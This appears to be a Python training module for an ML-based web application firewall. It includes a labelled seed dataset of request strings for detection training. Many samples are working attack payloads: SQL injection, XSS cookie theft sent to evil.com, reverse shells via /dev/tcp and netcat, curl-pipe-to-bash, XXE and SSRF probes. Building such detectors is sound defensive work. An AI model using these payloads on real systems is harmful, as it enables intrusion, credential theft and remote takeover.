"""ML model trainer for AI-WAF threat detection.

The model is a scikit-learn ``Pipeline`` combining:

1. A TF-IDF character-level n-gram vectoriser over the combined request text.
2. A ``FeatureUnion`` that appends hand-crafted numeric features.
3. A ``RandomForestClassifier`` (or ``GradientBoostingClassifier`` when
   ``boosting=True``) for final classification.

The pipeline is serialised with :mod:`joblib` and can be reloaded at inference
time without re-training.
"""

from __future__ import annotations

import logging
from pathlib import Path
from typing import Literal

import joblib
import numpy as np
import pandas as pd
from sklearn.ensemble import GradientBoostingClassifier, RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics import classification_report
from sklearn.model_selection import train_test_split
from sklearn.pipeline import Pipeline
from sklearn.preprocessing import LabelEncoder

logger = logging.getLogger("ai_waf.trainer")

ThreatLabel = Literal[
    "normal",
    "sql_injection",
    "xss",
    "command_injection",
    "path_traversal",
    "ldap_injection",
    "xxe",
    "ssrf",
]


# ── Training dataset ─────────────────────────────────────────────────────────

def _build_training_data() -> pd.DataFrame:
    """Return a labelled DataFrame of (combined_text, label) pairs.

    In a production system these samples would come from real traffic logs /
    public datasets (e.g. CSIC 2010, ECML/PKDD, WAF-Brain).  Here we ship a
    representative seed set that gives the model a meaningful starting point.
    """
    samples: list[dict[str, str]] = []

    # ── Normal requests ───────────────────────────────────────────────────
    normals = [
        "GET /index.html",
        "GET /api/users?page=1&limit=20",
        "POST /login username=alice&password=secret123",
        "GET /products?category=electronics&sort=price",
        "GET /search?q=hello+world",
        "POST /checkout cart_id=42&coupon=SAVE10",
        "GET /images/logo.png",
        "GET /api/v1/articles?author=bob&published=true",
        "POST /api/comments body=Great+post%21&post_id=7",
        "GET /users/profile?id=123",
        "GET /docs/api-reference",
        "POST /upload filename=report.pdf&size=2048",
        "GET /sitemap.xml",
        "GET /favicon.ico",
        "GET /health",
        "GET /about-us",
        "POST /feedback name=John&message=Thanks+for+the+service",
        "GET /api/weather?city=London",
        "GET /cdn/js/app.min.js",
        "POST /newsletter email=user@example.com",
        "GET /products/42/reviews",
        "DELETE /api/sessions/me",
        "PUT /users/7 name=Alice&email=alice@example.com",
        "GET /blog/2024/hello-world",
    ]
    for s in normals:
        samples.append({"text": s, "label": "normal"})

    # ── SQL Injection ─────────────────────────────────────────────────────
    sqli = [
        "GET /search?q=' OR '1'='1",
        "POST /login username=admin'--&password=x",
        "GET /products?id=1 UNION SELECT null,null,null--",
        "GET /users?id=1; DROP TABLE users--",
        "GET /article?id=1' AND SLEEP(5)--",
        "POST /search q=1' OR 1=1#",
        "GET /items?id=1 AND 1=1 UNION SELECT username,password FROM users--",
        "GET /page?id=1 WAITFOR DELAY '0:0:5'",
        "POST /api/data value=' OR ''='",
        "GET /download?file=../../etc/passwd",
        "GET /report?year=2020 UNION ALL SELECT NULL--",
        "POST /login user='; INSERT INTO admins VALUES('evil','evil')--",
        "GET /users?name=x' OR 'x'='x",
        "GET /search?q=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "POST /update id=1;UPDATE users SET admin=1 WHERE id=2--",
        "GET /products?cat=1' HAVING 1=1--",
        "GET /items?id=-1 UNION SELECT table_name FROM information_schema.tables--",
        "POST /order item=1' OR BENCHMARK(5000000,MD5(1))--",
    ]
    for s in sqli:
        samples.append({"text": s, "label": "sql_injection"})

    # ── XSS ───────────────────────────────────────────────────────────────
    xss = [
        "GET /search?q=<script>alert(1)</script>",
        "POST /comment body=<img src=x onerror=alert('XSS')>",
        "GET /page?redirect=javascript:alert(document.cookie)",
        "GET /name?val=<svg onload=fetch('//evil.com?'+document.cookie)>",
        "GET /greet?name=<iframe src=javascript:alert(1)>",
        "POST /feedback msg=';alert(String.fromCharCode(88,83,83))//",
        "GET /search?q=\"><script>document.location='http://evil.com/x?'+document.cookie</script>",
        "POST /review text=<body onload=alert(1)>",
        "GET /page?id=<object data=javascript:alert(1)>",
        "GET /user?name=<script src=//evil.com/xss.js></script>",
        "GET /item?q=<details open ontoggle=alert(1)>",
        "POST /msg body=<img/src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "GET /ref?url=<a href=javascript:alert(1)>click</a>",
        "POST /content data=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "GET /name?v=<marquee onstart=alert(1)>",
    ]
    for s in xss:
        samples.append({"text": s, "label": "xss"})

    # ── Command Injection ─────────────────────────────────────────────────
    cmdi = [
        "GET /ping?host=127.0.0.1;cat /etc/passwd",
        "POST /convert file=image.jpg&&id",
        "GET /tools?cmd=ls -la /var/www",
        "POST /log entry=`whoami`",
        "GET /exec?command=curl http://evil.com|bash",
        "POST /process input=$(cat /etc/shadow)",
        "GET /util?op=ping -c 1 8.8.8.8;wget http://evil.com/shell.sh",
        "GET /render?template=;bash -i >& /dev/tcp/evil.com/4444 0>&1",
        "POST /convert src=doc.pdf&dst=out.pdf;nc -e /bin/bash evil.com 4444",
        "GET /api?q=test|whoami",
        "GET /run?code=python -c 'import os;os.system(\"id\")'",
        "POST /scan target=host;python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    ]
    for s in cmdi:
        samples.append({"text": s, "label": "command_injection"})

    # ── Path Traversal ────────────────────────────────────────────────────
    pt = [
        "GET /download?file=../../etc/passwd",
        "GET /static/../../../etc/shadow",
        "GET /file?name=..%2F..%2Fetc%2Fpasswd",
        "GET /image?path=....//....//etc//passwd",
        "GET /load?doc=..\\..\\windows\\win.ini",
        "GET /fetch?resource=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "GET /template?file=../config/database.yml",
        "POST /read path=../../../root/.ssh/id_rsa",
        "GET /view?name=..%c0%af..%c0%afetc%c0%afpasswd",
        "GET /include?file=/etc/hosts",
        "GET /assets?src=../../.env",
    ]
    for s in pt:
        samples.append({"text": s, "label": "path_traversal"})

    # ── LDAP Injection ────────────────────────────────────────────────────
    ldap = [
        "GET /auth?user=*)(uid=*))(|(uid=*",
        "POST /ldap query=(uid=admin)(&(password=*))",
        "GET /search?cn=*)(&",
        "GET /users?filter=(objectClass=*))%00",
        "POST /login dn=)(|(cn=*",
        "GET /dir?name=admin)(&(1=0",
    ]
    for s in ldap:
        samples.append({"text": s, "label": "ldap_injection"})

    # ── XXE ───────────────────────────────────────────────────────────────
    xxe = [
        'POST /api/xml <?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        'POST /upload body=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/x">]>',
        'POST /parse <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>',
        'POST /xml <!ENTITY % d SYSTEM "http://evil.com/evil.dtd">',
        'POST /soap <?xml version="1.0"?><!DOCTYPE foo PUBLIC "-//EVIL//DTD" "http://evil.com/evil.dtd">',
    ]
    for s in xxe:
        samples.append({"text": s, "label": "xxe"})

    # ── SSRF ──────────────────────────────────────────────────────────────
    ssrf = [
        "GET /fetch?url=http://localhost/admin",
        "POST /proxy target=http://127.0.0.1:8080/secret",
        "GET /load?src=http://192.168.1.1/config",
        "GET /img?url=http://169.254.169.254/latest/meta-data/",
        "POST /webhook url=http://10.0.0.1:22/",
        "GET /redirect?to=ftp://127.0.0.1/pub",
        "GET /resource?uri=http://metadata.google.internal/computeMetadata/v1/",
        "GET /pdf?src=http://[::1]/admin",
    ]
    for s in ssrf:
        samples.append({"text": s, "label": "ssrf"})

    return pd.DataFrame(samples)


# ── Pipeline builder ─────────────────────────────────────────────────────────

def build_pipeline(boosting: bool = False) -> Pipeline:
    """Return an untrained scikit-learn ``Pipeline``.

    Parameters
    ----------
    boosting:
        When ``True`` use ``GradientBoostingClassifier``; otherwise use
        ``RandomForestClassifier`` (faster to train, suitable for inference).
    """
    vectorizer = TfidfVectorizer(
        analyzer="char_wb",
        ngram_range=(2, 5),
        max_features=50_000,
        sublinear_tf=True,
        strip_accents="unicode",
    )
    clf = (
        GradientBoostingClassifier(n_estimators=200, max_depth=5, random_state=42)
        if boosting
        else RandomForestClassifier(
            n_estimators=200,
            max_depth=None,
            min_samples_leaf=1,
            n_jobs=-1,
            random_state=42,
            class_weight="balanced",
        )
    )
    return Pipeline([("tfidf", vectorizer), ("clf", clf)])


# ── Public training function ─────────────────────────────────────────────────

def train_and_save(
    output_path: Path | str,
    *,
    boosting: bool = False,
    extra_data: pd.DataFrame | None = None,
    test_size: float = 0.20,
) -> Pipeline:
    """Train the threat-detection pipeline and serialise it with joblib.

    Parameters
    ----------
    output_path:
        Where to write the ``.joblib`` file.
    boosting:
        Use ``GradientBoostingClassifier`` instead of ``RandomForestClassifier``.
    extra_data:
        Optional additional labelled DataFrame with columns ``text`` and
        ``label`` to merge with the built-in seed dataset.
    test_size:
        Fraction of data to hold out for evaluation logging.

    Returns
    -------
    Pipeline
        The trained sklearn pipeline.
    """
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    df = _build_training_data()
    if extra_data is not None and not extra_data.empty:
        df = pd.concat([df, extra_data], ignore_index=True)

    X: list[str] = df["text"].tolist()
    y: list[str] = df["label"].tolist()

    le = LabelEncoder()
    y_enc = le.fit_transform(y)

    X_train, X_test, y_train, y_test = train_test_split(
        X, y_enc, test_size=test_size, random_state=42, stratify=y_enc
    )

    pipeline = build_pipeline(boosting=boosting)
    logger.info("Training model on %d samples…", len(X_train))
    pipeline.fit(X_train, y_train)

    # Evaluation
    y_pred = pipeline.predict(X_test)
    report = classification_report(y_test, y_pred, target_names=le.classes_, zero_division=0)
    logger.info("Evaluation on %d test samples:\n%s", len(X_test), report)

    # Save pipeline + label encoder together
    bundle = {"pipeline": pipeline, "label_encoder": le}
    joblib.dump(bundle, output_path)
    logger.info("Model bundle saved to %s", output_path)

    return pipeline


# ── Convenience loader ───────────────────────────────────────────────────────

def load_model(model_path: Path | str) -> tuple[Pipeline, LabelEncoder]:
    """Load a previously serialised model bundle.

    Returns
    -------
    (pipeline, label_encoder)
    """
    bundle: dict = joblib.load(str(model_path))
    return bundle["pipeline"], bundle["label_encoder"]
